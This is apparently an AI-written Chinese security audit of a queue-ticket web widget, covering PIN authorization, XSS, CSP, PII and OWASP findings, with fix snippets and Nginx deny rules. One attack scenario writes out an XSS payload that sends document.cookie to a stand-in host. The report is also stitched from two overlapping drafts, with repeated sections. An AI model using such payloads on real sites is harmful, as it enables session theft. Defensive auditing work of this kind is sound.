# 資安審計報告（Go-Live 前）

本報告以「新手最常犯的錯誤」視角，對「數位叫號嵌入式網頁模組」（digital-queue-widget）進行全面審計；內容包含公開檔案、認證與授權、PII 保護、OWASP Top 10 盤點、供應鏈與基礎設施建議，並提供可立即落地的修復步驟與範例。

---

## 專案簡介等基本資訊
- 專案名稱與簡介：數位叫號嵌入式網頁模組（Kiosk/Agent/Lobby + REST API + WebSocket + SQLite）
- 目標使用者：
  - 櫃員（Agent）、大廳顯示（Lobby）、臨櫃取號使用者（Kiosk）
- 處理的資料類型：
  - 是否處理個人身份資訊（PII）？是（電話號碼）
  - 是否處理支付或財務資訊？否
  - 是否有用戶上傳內容（UGC）？否（無檔案上傳）
- 技術棧（Tech Stack）：
  - 前端：原生 HTML/CSS/JS + Socket.IO（多頁）
  - 後端：Node.js + Express + Socket.IO + better-sqlite3
  # 資安審計報告（Go-Live 前）

  本報告以「新手最常犯的錯誤」視角，對「數位叫號嵌入式網頁模組」（digital-queue-widget）進行全面審計；涵蓋公開檔案、認證與授權、PII 保護、OWASP Top 10 盤點、供應鏈與基礎設施建議，並提供可立即落地的修復步驟與範例。

  ---

  ## 專案簡介等基本資訊（依目前檔案推斷，若有誤請回覆更正）
  - 專案名稱與簡介：數位叫號嵌入式網頁模組（Kiosk/Agent/Lobby + REST API + Socket.IO + SQLite）
  - 目標使用者：臨櫃取號使用者（Kiosk）、櫃員（Agent）、大廳顯示（Lobby）、管理員（Admin）
  - 處理的資料類型：
    - 是否處理個人身份資訊（PII）？是（電話號碼 phone）
    - 是否處理支付或財務資訊？未見（請確認）
    - 是否有用戶上傳內容（UGC）？否（無檔案上傳）
  - 技術棧（Tech Stack）：
    - 前端：原生 HTML/CSS/JS，多頁面 + Socket.IO 即時事件
    - 後端：Node.js + Express + Socket.IO
    - 資料庫：SQLite（better-sqlite3，WAL 模式）
  - 部署環境/伺服器類型：未提供（推測一般 Node 服務；建議置於反向代理之後並啟用 TLS）
  - 外部依賴與服務：
    - NPM 套件：bcryptjs, better-sqlite3, cors, dayjs, express, qrcode, sharp, socket.io, svg-captcha（dev：nodemon）
    - 外部 API 服務：未見（請確認）
    - 使用的雲端服務：未見（請確認）
  - 程式碼存取：以本工作區為準（未連結外部遠端）

  需釐清/請補充（請在回覆提供）：
  1) 實際部署型式（自架/雲端、是否多實例、前置反向代理/Nginx、是否全站 HTTPS）
  2) 正式允許的前端網域清單（供 CORS/Socket.IO 鎖定）
  3) 是否計畫將 Captcha 與 Session/登入狀態跨多實例共享（如 Redis）
  4) 是否需保留歷史票券與電話的保存年限（資料生命週期與清除策略）
  5) 是否需要審計軌跡（誰、何時、對哪張票做了什麼）

  ---

  ## 第一部分：新手常見的災難性錯誤檢查（Disaster-Class）

  以下項目一旦上公網極易釀災；每項提供攻擊劇本與修復原理。

  ### 威脅：高風險 - 管理/代理授權依賴「靜態 PIN + 可被 JS 讀取的 Web 儲存」
  - 風險等級：高
  - 威脅描述：受保護 API 以 `x-agent-pin` 與環境變數 `AGENT_PIN` 比對授權。Admin/Agent 前端把 PIN 與 CSRF token 存在 `sessionStorage`（`public/admin/agents.html`、`public/agent/index.html`）。任一頁面出現 XSS，攻擊者即可讀取 PIN/CSRF，遠端任意呼叫敏感 API（新增/刪除帳號、叫號、結束服務、轉櫃）。
  - 受影響元件：`server.js`（`requirePin`、CSRF 判定邏輯）、`public/admin/agents.html`、`public/agent/index.html`

  （--- 高風險專屬區塊 ---）
  - 駭客攻擊劇本（Hacker's Playbook）
    > 我釣管理員點開一個惡意頁。因為站內允許 `unsafe-inline`，只要有任何微小的 DOM 注入點，或我能在同源頁插入 DOM，就能執行腳本；接著我直接讀 `sessionStorage.admin_pin` 與 `sessionStorage.admin_csrf`。拿到 PIN 後，我在自己電腦就能用 `x-agent-pin` 打 API：新增/刪除 agent、對任意票據 call/finish/cancel/transfer。整個系統就聽我的。

  - 修復原理（Principle of the Fix）
    > 機密不應出現在前端可讀儲存（local/sessionStorage）。改用伺服器簽發、放在 HttpOnly Cookie 的 Session/JWT 表示授權狀態，JS 取不到 Cookie 內容，XSS 雖可發出請求，但少了可攜帶到攻擊者外站的憑證且可再加上同源/CSRF 防護；再搭配嚴格 CSP（移除 `unsafe-inline`、採 nonce/hash），顯著降低 XSS 機率與影響面。
  （--- 專屬區塊結束 ---）

  - 修復建議與程式碼範例（漸進式）
    1) 立即（P0）
       - 停止在前端保存 `admin_pin`（Admin/Agent 頁面），改為以「登入」發 Token 的流程：POST `/api/login` 驗證後，由伺服器簽發 HttpOnly, Secure, SameSite=Strict 的 Cookie（JWT/Session），並於受保護 API 僅驗 Cookie，不再接受 `x-agent-pin`。
       - 在 `server.js` 加入權限模型（角色：admin/agent），以使用者身分授權，不以全域 PIN。
       - 關閉 `requireCsrf` 的「僅在 Origin 命中才檢查」豁免；對 Cookie 型請求一律驗 CSRF（雙送 Cookie、或 SameSite+非簡單方法核對 CSRF Token）。
    2) 近期（P1）
       - 將 `/api/admin/*` 與 `/api/agent/*` 全面切到 Cookie 驗證，逐步移除 `x-agent-pin` 支援（保留短期相容視需要）。
       - 管理頁與櫃員頁前端改用 `fetch` 自動攜帶 Cookie（`credentials: 'same-origin'`），不再讀/存任何祕密。
    3) 範例（伺服器簽發 JWT 到 HttpOnly Cookie）
       - 登入成功後：`res.cookie('sid', jwt, { httpOnly:true, secure:true, sameSite:'Strict', maxAge: 60*60*1000 })`；後續 `auth` middleware 檢查 `sid` 驗簽並附上 `req.user`。

  ---

  ### 威脅：高風險 - 寬鬆 CSP + 多處 `innerHTML` 直灌（XSS 風險）
  - 風險等級：高
  - 威脅描述：目前 CSP 允許 `script-src 'unsafe-inline'`（`server.js` 中的 CSP middleware）。前端多處以 `innerHTML` 將動態資料直接插入（如 `admin/agents.html` 的清單、`agent/index.html` 與 `lobby/index.html` 表格/行）。若攻擊者能將惡意字串寫入 DB（如 agent 名稱、counter），或藉由任何反射點注入，將導致任意 JS 執行、竊取 Session。
  - 受影響元件：`server.js`（CSP）、`public/admin/agents.html`、`public/agent/index.html`、`public/lobby/index.html`

  （--- 高風險專屬區塊 ---）
  - 駭客攻擊劇本
    > 我先用 PIN 建一個帳號，名稱設成 `<img src=x onerror=fetch('https://my.tld?c='+document.cookie)>`。管理頁拉清單時把這段塞進 `innerHTML`，我的程式就跑了；若你用 Cookie 登入模型，這時 Cookie 也被我帶走了。

  - 修復原理
    > 關鍵是「資料」與「指令」分離：任何要進 DOM 的字串都必須轉為文字節點或經過安全的 escaping；另外，嚴格的 CSP（移除 `unsafe-inline`，採 nonce/hash）可讓隨機注入的 <script> 無法執行。
  （--- 專屬區塊結束 ---）

  - 修復建議
    - 伺服器：改用嚴格 CSP，移除 `script-src 'unsafe-inline'`；使用每請求 `nonce` 並套用到合法腳本。
    - 前端：
      - 以 `textContent`/`createTextNode` 代替 `innerHTML`；確需 HTML 片段時，對插值欄位進行 HTML Escape（實作 `escapeHtml()`）。
      - 對從 DB 讀出的欄位（account/name/counter/role/number）全部 escape 後再插入。
    - 範例 Escape：`str.replace(/[&<>'"]/g, c => map[c])`。

  ---

  ### 威脅：中高風險 - DB 與專案根目錄可能被 Web 伺服器誤曝（路徑/設定）
  - 風險等級：中高
  - 威脅描述：`express.static('public')` 僅暴露 `public/`。但若反向代理或容器錯誤將 docroot 指到專案根，則 `.env`、`db/*.db*`、`package.json`、`security-fixes.md` 等皆可被下載。
  - 修復建議：
    - 反向代理（Nginx/Apache）docroot 只指向 `public/`；明確 deny `/.git`, `/.env*`, `/db/*`, `/package*.json`, `/security-*.md`。
    - 將 `db/` 移到服務器不可公開的目錄（或容器 volume），避免與 Web 根目錄同層。
    - 建立 WAF 規則阻擋對敏感檔案的 HTTP 存取。

  ---

  ### 威脅：中高風險 - PII（電話）明文儲存、缺乏資料生命週期
  - 風險等級：中高（依合規要求可能升高）
  - 威脅描述：電話以明文保存在 SQLite，尚無保存年限/清除機制。若 DB 外洩將直接暴露。
  - 修復建議：
    - 至少行級或欄位級加密（可用應用層加密或採用 SQLCipher/OS 磁碟加密），密鑰由 KMS/HSM 管理。
    - 設定保留政策（如完成後 90 天刪除或匿名化），提供批次清理作業。
    - 保持最小揭露：前台 API 已移除 phone 良好，Agent 端加強授權與查詢最小化。

  ---

  ### 威脅：中高風險 - 缺乏風險端點保護（頻率/濫用）
  - 風險等級：中高
  - 描述：`/api/captcha/*`、`/api/login`、`/api/agent/*` 尚無速率限制、IP 檢測、暴力嘗試防護；雖有 Captcha，但應搭配 IP-based rate limit 與帳號鎖定策略。
  - 修復建議：
    - 以 `express-rate-limit` 對 `/api/login`, `/api/captcha/*`, `/api/agent/*` 設定限制與逾限封鎖/延遲。
    - 於登入增加帳號鎖定/退避（exponential backoff）。
    - 建置稽核日誌（失敗/成功）與告警。

  ---

  ### 威脅：中風險 - Socket.IO 未加身分綁定/授權
  - 風險等級：中
  - 描述：任何人皆可連線收到 `queue:update`/`call:made` 廣播（雖非高度敏感，但仍是營運資料）。
  - 修復建議：
    - 對 Agent/Lobby 頻道使用具名 namespace 或 room 與授權（基於 Cookie 的 Session）。
    - 若需公開 Lobby，可只提供最少欄位且加上節流。

  ---

  ### 威脅：中風險 - README 範例與操作指引中的弱 PIN/指令殘留
  - 風險等級：中
  - 描述：README 末段存在以 `x-agent-pin: 0000` 的殘留片段；容易被誤用到實際環境。
  - 修復建議：移除或以醒目警語標註「僅測試用，勿用於正式」。

  ---

  ## 第二部分：標準應用程式安全審計（OWASP Top 10）

  A01 權限控制失效（高）
  - 現況：以全域 PIN 駕馭所有敏感 API；缺乏使用者/角色綁定、資源層級授權（任一知道 PIN 者可操作所有票券）。
  - 修復：導入身分（login→JWT/Session Cookie）、角色（admin/agent）、資源授權（只能操作自己負責的櫃台或指派票）。

  A02 加密機制失效（中高）
  - 現況：HTTP/TLS 未描述；PII 明文；Cookie 尚未導入安全旗標；CSP 寬鬆。
  - 修復：全站 HTTPS + HSTS；Cookie 設定 `HttpOnly/Secure/SameSite=Strict`；資料庫欄位加密或磁碟加密；嚴格 CSP（移除 inline）。

  A03 注入（中→低）
  - 現況：SQL 皆使用參數化（better-sqlite3）；模板未拼接 SQL；相對安全。
  - 風險：DOM XSS 另行處理於 A07/A05。

  A04 不安全設計（高）
  - 現況：以 PIN 作為核心授權設計；缺少會話管理、最小權限、權限邊界等設計保護。
  - 修復：重設計授權流（會話+角色+資源 ACL），加上防濫用控制。

  A05 安全設定錯誤（高）
  - 現況：CSP `unsafe-inline`、CORS 容許無 Origin、缺乏安全 header（如 `helmet`）、靜態伺服器/反代可能誤曝。
  - 修復：導入 `helmet`、嚴格 CSP/CORS、反代 deny 敏感檔案、static 僅指向 public。

  A06 危險或過時的元件（中）
  - 現況：依 package.json 版本皆近年，仍建議 `npm audit --production`、Snyk/GHAS 監控，並鎖定可重現版本。

  A07 身分認證和驗證機制失效（高）
  - 現況：有 `/api/login` + Captcha + bcrypt 驗證，但登入後「未建立會話」，敏感 API 仍靠 PIN。
  - 修復：登入→簽發 Cookie（JWT/Session），後續以 Cookie 授權；PIN 退場。

  A08 軟體與資料完整性失效（中）
  - 現況：無建置簽章/Integrity；前端 script 未加 Subresource Integrity（SRI，若有外部資源）。
  - 修復：建置產物簽章、CI 驗證；外部資源加 SRI 或改走本機託管。

  A09 安全記錄與監控失效（中）
  - 現況：僅 console；無審計軌跡。
  - 修復：導入 request/安全日誌（winston/morgan）、失敗告警、稽核表（who/when/what）。

  A10 SSRF（低）
  - 現況：無外部 URL 取用路徑；風險低。

  ---

  ## 業務邏輯漏洞（Business Logic）
  - 任意 ticket 操作：只要知道 PIN，任何人可對任何票據 call/finish/cancel/transfer，缺少「責任歸屬/工作分配」限制。
  - 轉櫃/轉服務：`keepStatus` 等參數可被惡意濫用造成排隊跳序或阻斷。
  - 建議：
    - 「當班櫃員-櫃台」綁定，非自己櫃台不可操作，或需管理員授權。
    - 操作紀錄與可追溯性（誰、何時、對哪張票做了什麼）。

  ---

  ## 依賴與供應鏈安全（Dependency & Supply Chain）
  - 動作建議：
    - 執行 `npm ci && npm audit --production`，列出高風險 CVE 並升版。
    - 啟用 SCA（如 Snyk、GitHub Dependabot/GHAS）持續監控。
    - 鎖定 Node LTS；以 CI 強制 `npm ci` 重現建置。

  ---

  ## 資料庫與資料流安全（Database & Data Flow）
  - 傳輸中：全站 TLS（HTTPS），反代開啟 HSTS、TLS1.2+、安全 Cipher。
  - 靜態資料：PII 欄位加密或磁碟加密；DB 放置於非 Web 根目錄；備份加密；金鑰以環境變數+KMS 管理。
  - 權限：若未來接外部 DB，建立最小權限帳號（讀/寫分離視需求）。

  ---

  ## 外部服務與 API 整合安全（Third-Party & CORS）
  - CORS：當前以 `ALLOWED_ORIGINS` 白名單，且允許無 Origin（curl/Postman）。正式環境應只允許明確清單，並審慎考量是否需要接受無 Origin 的請求。
  - Webhook/外部 API：目前未見；若導入，需檢核簽章驗證與金鑰最小權限。

  ---

  ## 基礎設施與維運（Infra & DevOps）
  - 反向代理：docroot 僅指向 `public/`、封鎖敏感檔；啟用 gzip/br 與安全 header。
  - 監控：導入應用與安全日誌、指標（成功率、錯誤率、登入失敗、敏感 API 使用量）。
  - 秘密管理：以 `.env`/環境變數搭配密鑰管控；嚴禁把祕密寫進程式碼或前端。

  ---

  ## 第三部分：大型專案的特別策略（Pattern 掃描）
  我發現多處高風險模式可能重複出現：
  1) 前端 `innerHTML` 直接插入未 escape 的變數
  2) 以 PIN/自訂 header 進行敏感授權

  建議分段檢核：
  - 先針對 Admin/Agent 相關檔案全面移除 `innerHTML` 的不安全插值，改用 `textContent` 或 Escape Helper。
  - 再針對所有敏感 API 改為 Cookie 會話授權，移除 PIN。

  是否同意我產生一個純讀取的自動化掃描腳本（RegEx）協助你快速盤點？
  - 腳本僅搜尋、列出疑似問題位置，不修改檔案。
  - 目標：
    - 搜尋 `innerHTML\s*=|\.innerHTML\s*\+?=` 與模板字面量中插值 `${...}`
    - 搜尋 `x-agent-pin`、`sessionStorage`/`localStorage` 中疑似憑證/祕密
  若同意，我將提供一個可在本倉庫執行的 PowerShell/Node 腳本以產生報表。

  ---

  ## 立即落地的修復清單（摘要）
  1) 會話與授權（高、P0）
     - 導入 Cookie 會話（JWT/Session），`/api/*` 僅驗 Cookie；PIN 退場
     - 加入角色與資源授權（自己櫃台/被指派票才能操作）
  2) XSS 與 CSP（高、P0）
     - 移除 `unsafe-inline`，採用 `nonce`；所有動態插值改 `textContent`/Escape
  3) 風險端點防濫用（中高、P0）
     - `express-rate-limit` 於 `/api/login`、`/api/captcha/*`、`/api/agent/*`；登入退避與鎖定機制
  4) PII 與資料壽命（中高、P1）
     - 電話欄位加密或 OS 磁碟加密；訂定保存與清除策略
  5) 基礎設施（中、P1）
     - 反向代理 docroot 指向 `public/`；封鎖敏感檔；全站 TLS + HSTS
  6) 日誌與稽核（中、P1）
     - 安全事件與審計表；告警
  7) 供應鏈（中、P1）
     - `npm audit --production`、啟用 SCA 與自動升版

  ---

  ## 附：簡化修正範例片段（示意）

  1) 嚴格 CSP（示意）
  ```
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; img-src 'self' data: blob:; font-src 'self' data:; style-src 'self'; script-src 'self' 'nonce-"+nonce+"'; connect-src 'self' wss:"
  );
  ```

  2) 伺服器簽發 Cookie（JWT）
  ```
  // 登入成功
  const token = sign({ uid: user.id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '1h' });
  res.cookie('sid', token, { httpOnly: true, secure: true, sameSite: 'Strict', maxAge: 3600_000 });
  ```

  3) 前端安全插值
  ```
  // 替代 innerHTML 直接插入：
  const tr = document.createElement('tr');
  const td = document.createElement('td');
  td.textContent = String(agent.name || '');
  tr.appendChild(td);
  tbody.appendChild(tr);
  ```

  4) 反向代理保護（Nginx 範例）
  ```
  location ~ ^/(\.git|\.env|db/|package\.json|package-lock\.json|security-.*\.md) { return 403; }
  ```

  ---

  如需我產生自動化掃描腳本或協助落地上述修正，請回覆部署環境與是否授權產生掃描腳本。我會依你的環境提供最小變動、可回滾的改造方案。
（--- 高風險專屬區塊 ---）
- 駭客攻擊劇本：
  > 我只要找到能反射或儲存一段 `<img src=x onerror=...>` 的地方，就能在使用者的瀏覽器執行任意 JS。因為 CSP 放行了 inline script，我不需要再繞其他防線。拿到管理員的 PIN 之後，我就能遠端操控你的後台。

- 修復原理：
  > 把「任何行內腳本」視為違法。只允許外掛檔案 + nonce/hash，這樣即使有可控字串插入 DOM，也難以升級為可執行的 JS。
（--- 專屬區塊結束 ---）

- 修復建議與程式碼範例：
  - 移除 inline `<script>` 與 `<style>`，搬到 `/public/.../*.js|*.css`。
  - 使用 `helmet` 設定：`script-src 'self' 'nonce-<random>'`；後端動態注入 nonce；前端 script 標上對應 nonce。
  - 將 `font-src` 的外站 `r2cdn.perplexity.ai` 移除（非必要且引入追蹤/隱私風險）。

---

### 威脅標題：中風險 - 敏感 API 的單點憑證（PIN）缺少行為防護
- 風險等級：中
- 威脅描述：login/captcha/qrcode 及所有受保護 API 未設速率限制；Captcha 與 CSRF token 採記憶體 store，雖有 TTL 清理，仍可能被濫用造成資源耗用與記憶體壓力。
- 受影響的元件：`/api/login`、`/api/captcha/*`、`/api/qrcode`、`/api/admin/*`、`/api/agent/*`。
- 修復建議：導入 `express-rate-limit`；為 captcha/CSRF store 設最大容量或改用 Redis；qrcode 端點可加入簡單節流和大小限制。

---

### 威脅標題：中風險 - 前端 innerHTML/模板插入未全面轉義
- 風險等級：中
- 威脅描述：`admin/agents.html` 與 `agent/index.html` 多處以 template string 建立 HTML 並插入 DOM。雖目前回傳資料多為受控欄位，但長期而言風險在於未來新增欄位或顯示備註類內容時遺漏轉義，導致 XSS。
- 受影響的元件：`public/admin/agents.html`、`public/agent/index.html` 等。
- 修復建議：若不得不用 innerHTML，統一先以 `escapeHTML()` 轉義後再插入；優先改為以 `textContent`/屬性指派方式渲染。

---

### 已即時修補（本次我已代為完成）
- 修補 1：`GET /api/agents/:id` 現已加上 `requirePin` 授權保護（避免列舉單筆代理資訊）。
- 修補 2：`.gitignore` 已擴充忽略 `.env`、SQLite DB 與日誌等敏感/大型檔案（避免誤提交）。

驗證現況（對照原始碼）：
- PII 泄露：
  - `/api/tickets/waiting` 僅回 `id, serviceType, number, status, createdAt`，不含 phone（已安全）。
  - `/api/ticket/:id` 會剝除 `phone` 後回傳（`const { phone, ...rest } = row`）（已安全）。
- 登入：`/api/login` 需 Captcha 並以 bcrypt 驗證帳密，不存在「帳號不存在仍 ok」的 fallback（已安全）。
- CORS：由 `ALLOWED_ORIGINS` 控制，預設為 `http://localhost:3000`，建議上線前以環境變數收斂至正式網域。

---

## 第二部分：標準應用程式安全審計（對應 OWASP Top 10）

- A01 權限控制失效：
  - 高：敏感操作只靠靜態 PIN；前端以 sessionStorage 存 PIN，遇到 XSS 可被奪取。
  - 中：本次已補上 `/api/agents/:id` 保護；其餘受保護端點均有 `requirePin`。
- A02 加密機制失效：
  - 建議：前置反向代理提供 TLS（HTTPS/WSS）與 HSTS；Cookie 模式上線後配合 `Secure`。
- A03 注入式攻擊：
  - SQL：全部使用參數化查詢（風險低）。
  - XSS：CSP 過寬 + innerHTML 未統一轉義（中高風險）。
- A04 不安全的設計：
  - 使用靜態 PIN 作長期授權；建議改為標準登入/會話（JWT/Cookie）。
- A05 安全設定錯誤：
  - CSP 放行 `unsafe-inline`；缺少 `helmet` 與速率限制。
- A06 危險或過時元件：
  - 建議執行 `npm audit --production`、`npm outdated`，依報告升級；CI 納入 SCA。
- A07 身份認證機制失效：
  - 尚未導入標準會話；目前使用 PIN。
- A08 軟體與資料完整性失效：
  - 可在 CI 中加入建置完整性與檔案簽章（若有供應鏈需求）。
- A09 安全記錄與監控失效：
  - 建議加入 request/security audit log、告警與追蹤。
- A10 SSRF：
  - 目前無外部抓取；若未來新增 URL 代理需白名單與協定限制。

---

## 業務邏輯漏洞（Business Logic）
- 對票券「本人查詢」未使用不可猜測 token。建議：發行 `ticketToken`（QR 內含）作為查看票券詳情與進度的唯一憑證，避免可預測自增 id 被撞。
- 代理操作依賴 PIN，沒有人員個別追蹤。建議：改以帳號登入 + 角色，審計紀錄指向個人。

---

## 依賴與供應鏈安全
- 建議：
  - 執行 `npm audit --production`、`npm outdated`，升級有 CVE 的套件。
  - 使用 `npm ci` 確保可重現建置；CI 納入 SCA（Snyk/OWASP Dependency-Check）。

---

## 資料庫與資料流安全
- 傳輸中：上線時務必走 HTTPS/WSS。
- 靜態資料：SQLite 明文保存電話，主機遺失時可能外洩。建議：
  - 最小化保存（只存必要資訊）；
  - 或改以拆分/雜湊（搭配後四碼驗證流程）。
- OS 權限：Node 服務帳號最小化；DB 目錄限制讀寫（避免 777；檔案 640、目錄 750 起）。

---

## 外部服務與 API 整合安全（預備事項）
若未來接雲端/外部 API，請先確認：
1) 防火牆/IP 白名單是否最小化（嚴禁 0.0.0.0/0）？
2) API 金鑰是否限制來源/可呼叫的 API 範圍？
3) 是否有降級計畫（關閉功能/維護頁）？

---

## 基礎設施與維運安全
- 反向代理：建議 Nginx/Traefik 置前，統一處理 TLS、HSTS、CSP、安全標頭、上傳大小限制。
- 日誌/監控：morgan/winston 安全日誌（注意敏感欄位遮罩），錯誤告警（Sentry/Elastic/APM）。
- 健康檢查：`/api/health` 已有；可加 readiness/liveness 區分容器就緒與存活。
- 靜態檔案：Express 只暴露 `/public`；務必確保 `.env`、`.git`、`db/` 不透過 Web 伺服器對外（反代層同樣要 deny）。

---

## 修復建議與程式碼範例（可落地清單）

P0（立刻）
1) 收斂 CORS/Socket.IO：設定 `ALLOWED_ORIGINS` 為正式網域清單。
2) 敏感端點速率限制：以 `express-rate-limit` 保護 `/api/login`、`/api/captcha/*`、`/api/qrcode`、`/api/admin/*`、`/api/agent/*`。
3) 前端避免長期保存 PIN：移除 `sessionStorage` 持久保存，僅暫存於記憶體或每次操作再次輸入。

P1（本週）
4) XSS 硬化：
   - 將 inline `<script>`/`<style>` 外掛化；
   - server 端 CSP 改用 nonce/hash 並移除 `unsafe-inline`；
   - 統一以 `escapeHTML()` 處理 innerHTML 插入。
5) 安全標頭：導入 `helmet`（包含 HSTS、X-Frame-Options、Referrer-Policy、X-Content-Type-Options 等）。
6) 管理/代理審計：記錄新增/修改/刪除與叫號等操作，包含來源 IP/帳號。

P2（本月）
7) 把 PIN 模式升級為標準登入：JWT + HttpOnly Cookie + 角色權限（admin/agent），以 `requireAuth` 取代 `requirePin`。
8) PII 最小化/拆分保存；評估將 SQLite 移至受管 DB 或至少落地在加密磁碟。
9) CI SCA：`npm audit`、Snyk/Dependency-Check 自動掃描與阻擋高風險發佈。

最小 HTML 轉義工具（前端）
```js
function escapeHTML(s){
  return String(s)
    .replaceAll('&','&amp;')
    .replaceAll('<','&lt;')
    .replaceAll('>','&gt;')
    .replaceAll('"','&quot;')
    .replaceAll("'",'&#39;');
}
```

Nginx（反向代理）禁止敏感路徑（示意）
```nginx
location ~ /\.(env|git|htaccess) { deny all; }
location /db/ { deny all; }
```

---

## 第三部分：大型專案特別策略
- 分段檢核建議：
  - 依模組拆解推進（認證/授權 → CSP/前端外掛化 → PII/資料保護），每段建立驗收清單與回歸測試。
- 自動化掃描（請求授權）：
  - 我發現了可重複的風險模式（inline script、innerHTML、PIN 儲存、PII 欄位）。為確保覆蓋率，是否同意我生成一個只讀 RegEx 掃描腳本來搜尋：
    - 任何 `innerHTML =`、`insertAdjacentHTML`、模板字面插入 DOM；
    - 回傳 `phone` 的 API；
    - `unsafe-inline` 與外站 `font-src`；
    - `sessionStorage`/`localStorage` 儲存敏感資訊。

---

## 變更紀錄（本次代辦事項）
- 已修：`GET /api/agents/:id` 改為 `requirePin` 保護。
- 已修：`.gitignore` 新增 `.env`、SQLite 與 log 相關忽略規則。

---

## 結語與後續
目前最急迫的是關閉 `unsafe-inline` 與將 PIN/授權從 Web 儲存搬離；完成 P0 之後再導入標準登入與 CSP 外掛化。請回覆部署環境與正式網域清單，我會根據你的情境提供精準的 `helmet`/CSP/反向代理範本與（若你同意）自動化掃描腳本。
